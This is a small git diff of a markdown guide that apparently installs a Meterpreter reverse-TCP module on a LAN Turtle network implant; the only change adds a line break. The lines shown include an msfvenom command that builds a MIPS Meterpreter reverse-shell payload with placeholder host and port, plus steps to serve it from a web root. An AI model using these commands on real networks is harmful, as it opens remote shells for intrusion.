@@ -14,7 +14,7 @@
 `chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 
 **3 - On Kali: generate Meterpreter payload with Msfvenom**<br />
-`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f elf > meterpreter-mipsbe-reverse-tcp`
+`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f elf > meterpreter-mipsbe-reverse-tcp`<br />
 `sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />
 
 **4 - On LAN Turtle, transfer Meterpreter payload**<br />
